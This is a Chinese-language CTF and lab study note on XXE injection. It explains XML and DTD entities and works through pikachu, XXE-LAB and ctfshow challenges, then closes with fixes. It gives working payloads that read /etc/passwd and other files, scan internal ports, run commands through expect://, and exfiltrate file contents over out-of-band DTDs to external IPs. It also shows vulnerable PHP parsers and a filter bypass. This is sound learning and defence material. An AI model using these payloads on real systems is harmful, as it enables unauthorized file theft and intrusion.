# 基础

[CTF XXE](https://www.cnblogs.com/20175211lyz/p/11413335.html)

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具

XXE漏洞全称XML External Entity Injection，即**xml外部实体注入漏洞**，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害

## 1、XML

`XML`即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：

- HTML 被设计用来显示数据
- XML 被设计用来传输和存储数据

XML文档结构包括：

- XML声明
- DTD文档类型定义（可选）
- 文档元素

先看一下典型的xml文档：

```xml
<!--XML声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!--DTD，这部分可选的-->          
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>

<!--文档元素-->                                                                          
<foo>&xxe;</foo>
```

## 2、DTD概念及声明/引用方式

DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。

DTD一般认为有两种引用或声明方式：

- 1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。
- 2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。

DTD实体有以下几种声明方式

### 内部实体

```xml
<!DOCTYPE note [
    <!ENTITY a "admin">
]>
<note>&a</note>
<!-- admin -->
```

### 参数实体

```xml
<!DOCTYPE note> [
    <!ENTITY % b "<!ENTITY b1 "awsl">">
    %b;
]>
<note>&b1</note>
<!-- awsl -->
```

- 参数实体用`% name`申明，引用时用`%name;`，只能在DTD中申明，DTD中引用。
- 其余实体直接用`name`申明，引用时用`&name;`，只能在DTD中申明，可在xml文档中引用

### 外部实体

```xml
<!DOCTYPE note> [
    <!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
]>
<note>&c</note>
<!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== -->
```

外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：
<img src="图片\1270588-20200115235522292-2141935835.png" alt="img"  />](png)
上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有
<img src="图片\1270588-20200115235555856-2031563427.png" alt="img" style="zoom:80%;" />

### 外部参数实体

```xml
<!DOCTYPE note> [
    <!ENTITY % d SYSTEM "http://47.106.143.26/xml.dtd">
    %d;
]>
<note>&d1</note>
<!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== -->
```

http://47.106.143.26/xml.dtd

```xml
<!-- http://47.106.143.26/xml.dtd -->
<!ENTITY d1 SYSTEM "data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==">
```

# XML外部实体注入

XML外部实体注入就是"攻击者通过向服务器注入指定的 xml 实体内容,从而让服务器按照指定的配置进行执行,导致问题"
也就是说服务端接收和解析了来自用户端的 xm l数据,而又没有做严格的安全控制,从而导致 xml 外部实体注入

一般来说请求头里  `X-Requested-With: XMLHttpRequest`   `Content-Type:application/xml`

## 思路点

-**XXE黑盒发现**：

1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试

2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe

3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行

-**XXE白盒发现**：

1、可通过应用功能追踪代码定位审计

2、可通过脚本特定函数搜索定位审计

3、可通过伪协议玩法绕过相关修复等

## pikachu靶场尝鲜

漏洞代码分析，有回显

```php
<?php
if(isset($_POST['submit']) and $_POST['xml'] != null){
$xml =$_POST['xml'];
// $xml = $test;
$data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
if($data){
$html.="<pre>{$data}</pre>";
}else{
$html.="<p>XML 声明、DTD 文档类型定义、文档元素这些都搞懂了吗?</p>";
}
}
?>
```

获取 post 的 xml 文件 传递到 simplexml_load_string 再进行输出会遭成 xxe 注入

测试的 payload：

会回显 xxe

```
<?xml version = "1.0"?> <!DOCTYPE note [     <!ENTITY hacker "xxe"> ]> <name>&hacker;</name>
```

会读到当前目录的 1.txt

```
<?xml version = "1.0"?> <!DOCTYPE ANY [     <!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=1.txt"> ]> <x>&f;</x>
```

## XXE-LAB

```php
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; //账号
$PASSWORD = 'admin'; //密码
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');//这里面因为没有xml文档所以用的是php的伪协议来获取我们发送的xml文档

try{
    $dom = new DOMDocument();//创建XML的对象
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//将我们发送的字符串生成xml文档。
    $creds = simplexml_import_dom($dom);//这一步感觉相当于实例化xml文档

    $username = $creds->username;//获取username标签的值
    $password = $creds->password;//获取password标签的值

    if($username == $USERNAME && $password == $PASSWORD){//将获取的值与前面的进行比较。...
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);//注意必须要有username这个标签，不然的话找不到username,就没有了输出了，我们也不能通过回显来获取信息了
    }else{
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);//与上方相同，都会输出username的值，都可以达到我们的目的
    }    
}catch(Exception $e){
    $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```

抓包实验

<img src="图片\Snipaste_2023-02-05_19-58-45.png" alt="Snipaste_2023-02-05_19-58-45" style="zoom:80%;" />

1.1  读文件

```
<?xml version="1.0"?>
<!DOCTYPE Mikasa [
<!ENTITY test SYSTEM  "file:///c:/windows/win.ini">
]>
<user><username>&test;</username><password>Mikasa</password></user>
```

1.2 带外测试  

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://nzohgp.dnslog.cn">
    %file;
]>
<user><username>&send;</username><password>Mikasa</password></user>
```

<img src="图片\Snipaste_2023-02-05_20-05-16.png" alt="Snipaste_2023-02-05_20-05-16" style="zoom:80%;" />

2、外部引用实体dtd

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://43.142.255.132:1234/evil2.dtd">
    %file;
]>
<user><username>&send;</username><password>Mikasa</password></user>
```

evil2.dtd：

```
<!ENTITY send SYSTEM "file:///c:/windows/win.ini">
```

<img src="图片\Snipaste_2023-02-05_20-14-47.png" alt="Snipaste_2023-02-05_20-14-47"  />

3、无回显读文件

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "c:/windows/win.ini">
<!ENTITY % remote SYSTEM "http://127.0.0.1:8081/evil3.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

evil3.dtd：

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8081/get.php?file=%file;'>">
```

get.php:

```
<?php
$data=$_GET['file'];
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>
```

## XXE前端探针

环境：http://web.jarvisoj.com:9882/

1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试

2、**不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe**

流程：功能分析-前端提交-源码&抓包-构造Paylod测试

更改请求数据格式：Content-Type  为 application/xml

```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///home/ctf/flag.txt">
]>
<x>&f;</x>
```

<img src="图片\Snipaste_2023-02-05_20-28-46.png" alt="Snipaste_2023-02-05_20-28-46"  />

# 一些利用姿势

以下为有回显

1.读取敏感文件

```xml
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY b SYSTEM "file:///etc/passwd">]><c>&b;</c>
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY b SYSTEM" file:///C:/Windows/win.ini">]><c>&b;</c>
```

2.使用 php 伪协议 php://filter 读取文件

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
<!ELEMENT methodname ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=phpinfo.php" >]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>
```

3.扫描内网和端口

通过扫描 ip 和端口确定内网机器的 ip 和端口开发情况，访问端口会获取 baner 信息

```
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "http://127.0.0.1:80">
]>
<abc>&test;</abc>
```

4.执行命令

若开启 expect 扩展

```
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "expect://whoami">
]>
<abc>&test;</abc>
```

# ctfshow

## web373

题目

```php
<?php

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);    
```

payload：POST发包

```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<sun>
<ctfshow>&xxe;</ctfshow>
</sun>
```

## web374

这题好像是无回显

```php
<?php

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

payload：POST发包

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://43.142.255.132:1234/test.dtd">%xxe;]>
```

test.dtd

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://43.142.255.132:6666/?x=%file;'>">
%eval;
%exfiltrate;
```

在服务器用nc监听6666端口

```
nc -lvnp 6666
```

接收到 flag

<img src="图片\Snipaste_2023-02-05_21-06-20.png" alt="Snipaste_2023-02-05_21-06-20" style="zoom:80%;" />

## web375

发现了过滤，用空格绕过一下就可以了，步骤和上题一样
Payload:

```
<?xml   version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://118.31.165.63:8080/test.dtd">%xxe;]>
```

## web378

题目

<img src="图片\Snipaste_2023-02-05_21-10-20.png" alt="Snipaste_2023-02-05_21-10-20" style="zoom:80%;" />

payload

```
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///flag">]>
<user><username>&xxe;</username><password>a</password></user>
```

# 防御

XXE修复防御方案：

-方案1-禁用外部实体

```
PHP:

libxml_disable_entity_loader(true);

JAVA:

DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);

Python：

from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

-方案2-过滤用户提交的XML数据

过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC


